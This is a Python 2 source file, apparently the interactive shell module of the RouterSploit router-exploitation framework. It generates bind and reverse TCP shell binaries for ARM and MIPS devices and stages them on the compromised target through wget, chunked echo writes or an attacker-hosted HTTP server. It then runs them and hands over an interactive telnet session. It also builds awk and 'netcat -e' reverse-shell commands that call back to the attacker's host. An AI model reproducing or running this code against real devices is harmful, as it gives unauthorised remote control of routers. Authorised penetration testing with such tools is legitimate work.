import socket
import telnetlib
import SimpleHTTPServer
import BaseHTTPServer
import threading
import time

from printer import printer_queue
from routersploit import validators

from routersploit.utils import (
    print_info,
    print_error,
    print_success,
    print_status,
    random_text,
)

import routersploit.modules.payloads as payloads


def bind_tcp(arch, rport):
    print_status("Generating bind shell binary")

    if arch == 'armle':
        payload = payloads.armle_bind_tcp.Exploit()
    elif arch == 'mipsle':
        payload = payloads.mipsle_bind_tcp.Exploit()
    elif arch == 'mipsbe':
        payload = payloads.mipsbe_bind_tcp.Exploit()
    else:
        print_error("Platform not supported")
        return None

    payload.port = rport

    payload.generate()
    return payload.generate_elf()


def reverse_tcp(arch, lhost, lport):
    print_status("Generating reverse shell binary")

    if arch == 'armle':
        payload = payloads.armle_reverse_tcp.Exploit()
    elif arch == 'mipsle':
        payload = payloads.mipsle_reverse_tcp.Exploit()
    elif arch == 'mipsbe':
        payload = payloads.mipsbe_reverse_tcp.Exploit()
    else:
        print_error("Platform not supported")
        return None

    payload.target = lhost
    payload.port = lport

    payload.generate()
    return payload.generate_elf()


def shell(exploit, architecture="", method="", **params):
    while 1:
        while not printer_queue.empty():
            pass

        cmd = raw_input("cmd > ")

        if cmd in ["quit", "exit"]:
            return

        c = cmd.split()
        if len(c) and (c[0] == "bind_tcp" or c[0] == "reverse_tcp"):
            options = {}
            if c[0] == "bind_tcp":
                try:
                    options['technique'] = "bind_tcp"
                    options['rhost'] = validators.ipv4(exploit.target)
                    options['rport'] = int(c[1])
                    options['lhost'] = c[2]
                    options['lport'] = int(c[3])
                except:
                    print_error("bind_tcp <rport> <lhost> <lport>")

                payload = bind_tcp(architecture, options['rport'])

            elif c[0] == "reverse_tcp":
                try:
                    options['technique'] = "reverse_tcp"
                    options['lhost'] = c[1]
                    options['lport'] = int(c[2])
                except:
                    print_error("reverse_tcp <lhost> <lport>")

                payload = reverse_tcp(architecture, options['lhost'], options['lport'])

            communication = Communication(exploit, payload, options)

            if method == "wget":
                communication.wget(binary=params['binary'], location=params['location'])
            elif method == "echo":
                communication.echo(binary=params['binary'], location=params['location'])
            elif method == "awk":
                communication.awk(binary=params['binary'])
            elif method == "netcat":
                communication.netcat(binary=params['binary'], shell=params['shell'])
        else:
            print_info(exploit.execute(cmd))


class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        self.wfile.write(self.server.content)
        self.server.stop = True

    def log_message(self, format, *args):
        return


class HttpServer(BaseHTTPServer.HTTPServer):
    def serve_forever(self, content):
        self.stop = False
        self.content = content
        while not self.stop:
            self.handle_request()


class Communication(object):
    def __init__(self, exploit, payload, options):
        self.exploit = exploit
        self.payload = payload
        self.options = options
        self.binary_name = random_text(8)

    def http_server(self, lhost, lport):
        print_status("Setting up HTTP server")
        server = HttpServer((lhost, int(lport)), HttpRequestHandler)

        server.serve_forever(self.payload)
        server.server_close()

    def wget(self, binary, location):
        print_status("Using wget method")

        # run http server
        thread = threading.Thread(target=self.http_server, args=(self.options['lhost'], self.options['lport']))
        thread.start()

        # wget binary
        print_status("Using wget to download binary")
        cmd = "{} http://{}:{}/{} -O {}/{}".format(binary,
                                                   self.options['lhost'],
                                                   self.options['lport'],
                                                   self.binary_name,
                                                   location,
                                                   self.binary_name)

        self.exploit.execute(cmd)

        # execute binary
        if self.options['technique'] == "bind_tcp":
            self.execute_binary(location, self.binary_name)

            print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
            time.sleep(2)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.options['rhost'], self.options['rport']))

            print_success("Enjoy your shell")
            tn = telnetlib.Telnet()
            tn.sock = sock
            tn.interact()

        elif self.options['technique'] == "reverse_tcp":
            sock = self.listen(self.options['lhost'], self.options['lport'])
            self.execute_binary(location, self.binary_name)

            # waiting for shell
            self.shell(sock)

    def echo(self, binary, location):
        print_status("Using echo method")

        path = "{}/{}".format(location, self.binary_name)

        size = len(self.payload)
        num_parts = (size / 30) + 1

        # transfer binary through echo command
        print_status("Using echo method to transfer binary")
        for i in range(0, num_parts):
            current = i * 30
            print_status("Transferring {}/{} bytes".format(current, len(self.payload)))

            block = self.payload[current:current + 30].encode('hex')
            block = "\\\\x" + "\\\\x".join(a + b for a, b in zip(block[::2], block[1::2]))
            cmd = 'echo -ne "{}" >> {}'.format(block, path)
            self.exploit.execute(cmd)

        # execute binary
        if self.options['technique'] == "bind_tcp":
            self.execute_binary(location, self.binary_name)

            print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
            time.sleep(2)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.options['rhost'], self.options['rport']))

            print_success("Enjoy your shell")
            tn = telnetlib.Telnet()
            tn.sock = sock
            tn.interact()

        elif self.options['technique'] == "reverse_tcp":
            sock = self.listen(self.options['lhost'], self.options['lport'])
            self.execute_binary(location, self.binary_name)

            # waiting for shell
            self.shell(sock)

    def awk(self, binary):
        print_status("Using awk method")

        # run reverse shell through awk
        sock = self.listen(self.options['lhost'], self.options['lport'])
        cmd = binary + " 'BEGIN{s=\"/inet/tcp/0/" + self.options['lhost'] + "/" + self.options['lport'] + "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'"
        self.exploit.execute(cmd)

        # waiting for shell
        self.shell(sock)

    def netcat(self, binary, shell):
        # run reverse shell through netcat
        sock = self.listen(self.options['lhost'], self.options['lport'])
        cmd = "{} {} {} -e {}".format(binary, self.options['lhost'], self.options['lport'], shell)

        self.exploit.execute(cmd)

        # waiting for shell
        self.shell(sock)

    def execute_binary(self, location, binary_name):
        path = "{}/{}".format(location, binary_name)
        cmd = "chmod 777 {}; {}; rm {}".format(path, path, path)

        thread = threading.Thread(target=self.exploit.execute, args=(cmd,))
        thread.start()

    def listen(self, lhost, lport):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost, int(lport)))
        sock.listen(5)
        return sock

    def shell(self, sock):
        print_status("Waiting for reverse shell...")
        client, addr = sock.accept()
        sock.close()
        print_status("Connection from {}:{}".format(addr[0], addr[1]))

        print_success("Enjoy your shell")
        t = telnetlib.Telnet()
        t.sock = client
        t.interact()
